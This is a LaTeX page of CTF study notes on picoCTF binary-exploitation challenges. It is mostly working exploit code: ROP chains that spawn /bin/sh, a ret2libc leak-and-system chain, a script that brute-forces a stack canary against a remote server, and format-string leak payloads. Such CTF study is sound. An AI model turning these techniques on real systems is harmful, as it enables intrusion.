@@ -1,0 +1,393 @@
+\documentclass[main.tex]{subfiles}
+
+\begin{document}
+
+% 20 - 20 - 24 - 27 - 30 - 33
+\begin{tikzpicture}
+	\createpin{cgadget0}{35,0}
+	\begin{absnode}{cgadget0}{70}{0x080b073a : pop eax ; ret}
+		\begin{python}
+			def mov_eax(value):
+			    return 0x080B073A, value
+		\end{python}
+	\end{absnode}
+	
+	\createpin{cgadget1}{35,-20}
+	\begin{absnode}{cgadget1}{70}{0x080b361a : push eax ; call edx
+		       \\\vspace{-2mm}0x080583b9 : pop edx ; pop ebx ; ret}
+		\begin{python}
+			# affectee: eax, edx
+			def mov_ebx(value, modify_eax, modify_edx):
+			    return modify_edx(0x080583B9), modify_eax(value),          0x080B361A
+		\end{python}
+	\end{absnode}
+	
+	\createpin{cgadget2}{35,-52}
+	\begin{absnode}{cgadget2}{70}{0x080939d8 : mov ecx, eax ; mov eax, ecx ; ret}
+		\begin{python}
+			# affectee: eax
+			def mov_ecx(value, modify_eax=mov_eax):
+			    return modify_eax(value),              0x080939D8
+		\end{python}
+	\end{absnode}
+	
+	\createpin{cgadget3}{35,-78.2}
+	\begin{absnode}{cgadget3}{70}{0x0806ca26 : xchg edx, eax ; ret}
+		\begin{python}
+			# affectee: eax
+			def mov_edx(value, modify_eax=mov_eax):
+			    return modify_eax(value),              0x0806CA26
+		\end{python}
+	\end{absnode}
+	
+	\createpin{cgadget4}{35,-104.8}
+	\begin{absnode}{cgadget4}{70}{0x0807add3 : push esp ; call eax
+			       \\\vspace{-2mm}0x0804b27e : pop esi ; pop edi ; ret}
+		\begin{python}
+			# affectee: eax
+			def mov_edi_esp(modify_eax=mov_eax):
+			    return modify_eax(0x0804B27E),           0x0807ADD3
+		\end{python}
+	\end{absnode}
+
+	\createpin{cgadget5}{35,-133.6}
+	\begin{absnode}{cgadget5}{70}{0x08069997 : add eax, edi ; pop edi ; ret}
+		\begin{python}
+			# affectee: eax
+			CLOBBER = b"kim."
+			def mov_eax_esp(offset, modify_eax=mov_eax):
+			    return mov_edi_esp(),    modify_eax(offset),             0x08069997,                   CLOBBER
+		\end{python}
+	\end{absnode}
+	
+	\createpin{cgadget6}{35,-170.2}
+	\begin{absnode}{cgadget6}{70}{0x0805ee44 : push edx ; push ebx ; call eax
+			       \\\vspace{-2mm}0x0804b27d : pop ebx ; pop esi ; pop edi ; ret}
+		\begin{python}
+			# affectee: undefined
+			def push_edx_ebx(modify_eax=mov_eax):
+			    return modify_eax(0x0804B27D), 0x0805EE44
+		\end{python}
+	\end{absnode}
+	
+	\createpin{filename}{106,0}
+	\begin{absnode}{filename}{62}{}
+		\begin{python}
+			def filename():
+			    return 0x00, b"/bin//sh", 0x00
+		\end{python}
+	\end{absnode}
+	
+	\createpin{argv}{106,-20}
+	\begin{absnode}{argv}{62}{}
+		\begin{python}
+			def argv(offset):
+			    return mov_ebx(                        offset, mov_eax_esp, mov_edx),             mov_edx(0x00),        push_edx_ebx()
+		\end{python}
+	\end{absnode}
+
+	\createpin{syscall}{106,-49.6}
+	\begin{absnode}{syscall}{62}{0x0804a3c2 : cd80}
+		\begin{python}
+			def syscall():
+			    return 0x0804A3C2
+		\end{python}
+	\end{absnode}
+	
+	\createpin{payload}{106,-69.6}
+	\begin{absnode}{payload}{62}{\href{https://x86.syscall.sh}{[x86.syscall.sh]}}
+		\begin{python}
+			part_payload = flat(
+			  # populate buffer
+			  cyclic(0x1C),
+			  # construct argv = {&filename, NULL}
+			  argv(0xA8),
+			  
+			  # assign ebx = &filename
+			  mov_ebx(0x64, mov_eax_esp, mov_edx),
+			  # assign ecx = &argv[0]
+			  mov_ecx(-0x40, mov_eax_esp),
+			  # assign edx = &argv[1]
+			  mov_edx(-0x5C, mov_eax_esp),
+			  # assign eax = 11
+			  mov_eax(0x0B),
+			  # magic begin here!!!
+			  syscall(),
+			  
+			  # construct filename
+			  filename(),
+			)
+		\end{python}
+	\end{absnode}
+	
+	\createpin{gdb}{250,0}
+	\begin{absnode}[-1]{gdb}{70}{Bash commands}
+		\begin{bash}
+			ROPgadget --binary ?
+			ROPgadget --binary ? --opcode cd80
+		\end{bash}
+	\end{absnode}
+
+	\createpin{snippet}{250,-20}
+	\begin{absnode}[-1]{snippet}{70}{Python snippet}
+		\begin{python}
+			#!/bin/python3
+			from pwn import *
+			
+			context.arch = "i386"
+			part_payload = "FILL PAYLOAD HERE!!!"
+			
+			start_script = """
+			    continue
+			"""
+			program_paths = [
+			    "nc saturn.picoctf.net 61457",
+			    "./vuln",
+			]
+			
+			if args.REMOTE:
+			    program_path = program_paths[0].split()
+			else:
+			    program_path = program_paths[1]
+			
+			p = process(program_path)
+			
+			if not args.REMOTE:
+			    # context.log_level = "debug"
+			    context.gdb_binary = "pwndbg"
+			    gdb.attach(p, gdbscript=start_script)
+			
+			p.sendline(part_payload)
+			p.interactive()
+		\end{python}
+	\end{absnode}
+	
+	\createpin{gdb}{250,-125.3}
+	\begin{absnode}[-1]{gdb}{70}{Bash commands}
+		\begin{bash}
+			pwninit # if patchelf does not solve :)
+			checksec --file=?
+			patchelf --set-interpreter ? ?
+		\end{bash}
+	\end{absnode}
+	
+	\createpin{stackcache0}{176,0}
+	\begin{absnode}[1]{stackcache0}{68}{[stack cache] -- THIS IS NOT A PART OF ropfu SOLUTION !!!}
+		\begin{python}
+			CLOBBER = b"kim."
+			def mov(reg, value):
+			    # pop eax ; ret
+			    if reg == "eax":
+			        return 0x080B4D7A, value
+			    # pop ecx ; add al, 0xf6 ; ret
+			    if reg == "ecx":
+			        return 0x080647EF, value
+			    # pop edx ; xor eax.. ; pop edi ; ret
+			    if reg == "edx":		
+			        return 0x08070BD5, value, CLOBBER
+			
+			def xchg_eax(reg):
+			    # xchg esi, eax ; ret
+			    if reg == "esi":
+			        return 0x0805D022
+			
+			# 0x0804900e : ret
+			def stack_align():
+			    return 0x0804900E
+		\end{python}
+	\end{absnode}
+	
+	\createpin{stackcache1}{176,-79.3}
+	\begin{absnode}{stackcache1}{68}{[stack cache] -- THIS IS NOT A PART OF ropfu SOLUTION !!!}
+		\begin{python}
+			# 0x08059632 : push eax ; push edx ;          push esi ; call ecx
+			# 0x08049ba0 : pop edi ; ret
+			part_payload = flat(
+			    cyclic(0xE),
+			    0x08049810,  # win
+			    stack_align(),  # !overwrite flag
+			    
+			    xchg_eax("esi"),  # esi -> flag
+			    mov("edx", 0x080CF0A4),  # %s\n
+			    mov("ecx", 0x08049BA0),
+			    mov("eax", 0x0804995F),
+			    xchg_eax("esi"),  # esi -> printf
+			    0x08059632,
+			    cyclic(0x14),
+			    0x08049970,  # main
+			)
+		\end{python}
+	\end{absnode}
+
+	\createpin{aslr}{250,-149.3}
+	\begin{absnode}[-1]{aslr}{70}{Address Space Layout Randomization \href{https://github.com/rjwalls/CS4401-notes/blob/master/2099-01-09-aslr.md}{[CS4401]}}
+		\texttt{ASLR} will not randomize bits \texttt{0-11}\\\textit{cuz that would break page alignment} \\\\
+		\texttt{ASLR} will also not randomize bits \texttt{28-31}\\\textit{cuz it would make it harder to allocate big pages}\\\\
+		2common to bypass \texttt{coarse-grained ASLR}:
+		\begin{enumerate}
+			\item[\texttt{i.}] \texttt{information leaks}
+			\item[\texttt{ii.}] \texttt{brute forcing} -- often practical due to a lack of entropy in 32-bit address spaces
+		\end{enumerate}
+	\end{absnode}
+	
+	\createpin{free}{142.5, -149.3}	
+	\begin{absnode}[-1]{free}{70}{}
+		\includegraphics[width=\linewidth]{image/free.png}
+	\end{absnode}
+	
+	\drawcatenary{stackcache0}{stackcache1}{0}
+\end{tikzpicture}
+
+\newpage
+
+\begin{minipage}[t]{0.49\textwidth}
+	\begin{enumerate}
+		\setlength{\parskip}{1em}
+		\item[\texttt{[\_]}] \texttt{[seed-sPRiNG]} Using \texttt{time(null)} as a seed-generation function is the procedure's most critical flaw due to its predictability and low granularity. Solving it only requires reversing it and modifying it to print the numbers we need
+		\item[\texttt{[\_]}] 
+		\begin{minipage}[t]{0.37\textwidth}
+			\texttt{[buffer overflow 3]} Just examine byte by byte. Not a hard problem, but I still need a hint to solve it \texttt{:)}
+			\vspace{1em}
+			\item[\texttt{[\_]}] \texttt{[Unsubscriptions Are Free]} \texttt{Use-After-Free} \texttt{reused} chunk
+			\begin{bash}
+				(
+				  # scanf(stdio buffer)
+				  printf 'I\rY\rl';
+				  
+				  # stdio buffer resolve
+				  sleep 1;
+				   
+				  # read(file descriptor 0)
+				  printf '\xd6\x87\x04\x08';
+				)
+			\end{bash}
+		\end{minipage}
+		\hfill
+		\begin{minipage}[t]{0.52\textwidth}
+			\begin{bash}
+				#!/bin/bash
+				canary="\x42\x69" #...
+				target="nc saturn.picoctf.net 52460"
+				
+				for i in {0..255}; do
+				    itohex="\x$(printf "%02x" $i)"
+				    (
+				        perl -E 'print "68\n","a"x64'
+				        printf "${canary}${itohex}"
+				    ) > payload
+				    
+				    output=$(cat payload | $target)
+				    if [[ "$output" != *Smash* ]]; then
+				        printf "%02x" $i
+				        break
+				    fi
+				done
+			\end{bash}
+		
+		\end{minipage}
+		\item[\texttt{[\_]}] \texttt{[Cache Me Outside]} Change the metadata (at the top of the heap, ... or the arena) that points to the newest freed chunk! Two frustrating problems are the missing \texttt{ld} (just using \texttt{pwninit} or finding out the compatible \texttt{glibc} version, then downloading the related compatible \texttt{ld}) and the missing \texttt{flag.txt} (reversing solved the problem) \\[0.3em]
+		\makebox[\linewidth][c]{\texttt{printf "-\%d{\textbackslash}n{\textbackslash}x00" \$((0x6034a0-0x602088))}}
+		\item[\texttt{[\_]}] \texttt{[offset-cycleV2]} Apply the same approach as \texttt{[buffer overflow 3]}, but automate the identification of the canary value
+	\end{enumerate}
+	
+	\setlength{\parskip}{0.4em}
+	\userline
+	
+	\setlength{\parskip}{1em}
+	\begin{enumerate}
+		\setlength{\parskip}{0.9em}
+		\item[\texttt{[\_]}] \texttt{[\_\_Comment\_\_]} \texttt{[ropfu]} 
+		\begin{enumerate}[leftmargin=0pt, labelindent=0pt]
+			\item[] I handle two interleaved processes: identifying gadgets and constructing a possible relevance payload layout. In which the first one is processed under some criteria:
+			\item[] \texttt{(i) } Finding gadgets that modify the required registers (\texttt{eax}, \texttt{ebx}, \texttt{ecx}, \texttt{edx}) as little as possible and, if possible, only modify \texttt{eax}, which acts as a temporary register
+			\item[] \texttt{(ii)} Because of ASLR stack placement randomization, I assume nothing about the real-time absolute address in the stack; that is the reason for \texttt{mov\_eax\_esp}
+		\end{enumerate}
+		\setlength{\parskip}{1em}
+		\item[\texttt{[\_]}] \texttt{[\_\_Epilogue\_\_]} Well, I did something very complex, right? I skimmed through an online write-up (because of my laziness, I don’t reference anything here!) that points out that the \texttt{NX} bit is turned off, so a simpler way is to write shellcode into the stack, then populate the stack with \texttt{NOPs}, and finally, hopefully, point \texttt{eip} to the \texttt{NOPs} area
+	\end{enumerate}
+\end{minipage}
+\hfill
+\begin{minipage}[t]{0.49\textwidth}
+	\begin{enumerate}
+		\setlength{\parskip}{1em}
+		\item[\texttt{[\_]}] \texttt{[Here's a LIBC]} Very similar to \texttt{ropfu}, but here we need to determine: ``How can the \texttt{libc} address be leaked?'' as directed by the title\\
+		To solve this, we need to print the address of a function -- \texttt{puts}, in this case -- in \texttt{libc}, and the rest of the process is just as straightforward as in \texttt{ropfu}\\\\
+		\begin{minipage}[t]{0.37\textwidth}
+			\begin{python}
+				# 0x400913 : pop rdi ; ret
+				def mov_rdi(value):
+				    return 0x400913, value
+				
+				puts_puts_byte =         \
+				lambda x: flat(
+				    cyclic(0x88),
+				    # puts.got.plt + offs
+				    mov_rdi(0x601018 + x),
+				    0x400540,  # puts.plt
+				    0x400771,  # main
+				)
+				
+				def rop_chain(_puts):
+				    time.sleep(3)
+				    _libc = _puts - 0x080A30
+				    _system = _libc+0x04F4E0
+				    _bin_sh = _libc+0x1B40FA
+				    
+				    return flat(
+				        cyclic(0x88),
+				        stack_align(),
+				        mov_rdi(_bin_sh),
+				        _system,
+				    )
+			\end{python}
+		\end{minipage}
+		\hfill
+		\begin{minipage}[t]{0.52\textwidth}
+			\begin{python}
+				# 0x40052e : ret
+				def stack_align():
+				    return 0x40052E
+				
+				# expect: 0000 7f?? ???? ????
+				def extract_puts_address():
+				    time.sleep(3)  # start-up time
+				    pbytes, _ = [], p.recv(timeout=2.9)
+				    
+				    for i in range(7, -1, -1):
+				        p.sendline(puts_puts_byte(i))
+				        time.sleep(1)  # delay time
+				        _ = p.recv(timeout=0.9)
+				        
+				        if not "size" in locals()             or len(_) == size:
+				            pbytes.append(0x00)
+				            size = len(_)
+				            continue
+				        
+				        pchar = _.split(b"\n", 1)[1][0]
+				        pbytes.append(pchar)
+				    
+				    return int.from_bytes(              pbytes, "big")
+			\end{python}
+		\end{minipage}
+		
+		\item[\texttt{[\_]}] \texttt{[stack cache]} Well, nothing’s interesting there. Just other \texttt{ROP} problem w ``cache''
+		\item[\texttt{[\_]}] \texttt{[Guessing Game 2]} Has been the most fascinating yet frustrating problem so far!!!
+		\setlength{\parskip}{0.4em}
+		\begin{enumerate}[leftmargin=0pt, labelindent=0pt]
+			\item[] Its allure lies in the intricate challenges it presents:\\ \texttt{(i)} understanding \texttt{page\_size}, \texttt{(ii)} mastering format strings to leak the canary and libc addresses, and ultimately \texttt{(iii)} constructing a successful \texttt{ROP} chain
+			\item[] On the other hand, the frustration comes from the absence of a warning when the executable runs normally with a mismatched \texttt{libc} version
+		\end{enumerate}
+		\setlength{\parskip}{0.6em}
+		\begin{python}
+			# random.dynsym.value L: 0x000405c0 and libc.base.value B: 0x?????000 
+			payload2nguess = -2623 # rand % 4096 == sgn(B+L) * mod(|B+L|, 0x1000)
+		\end{python}
+		\begin{python}
+			# canary [EBP - 12]  # winner [EBP - 524]  # PUSH &winner [EBP - 552]
+			payload2canary = b"%x" * 118 + b"-%X"             # dunno ???
+			payload2canary = b"%p" * 134 + b"-%X"             # 4x = 552 -  12 
+			payload2printf = b"%p" *  13 + b"%s" + printf.got # 4x = 552 - 524 + 2x
+		\end{python}
+	\end{enumerate}
+\end{minipage}
+\end{document}
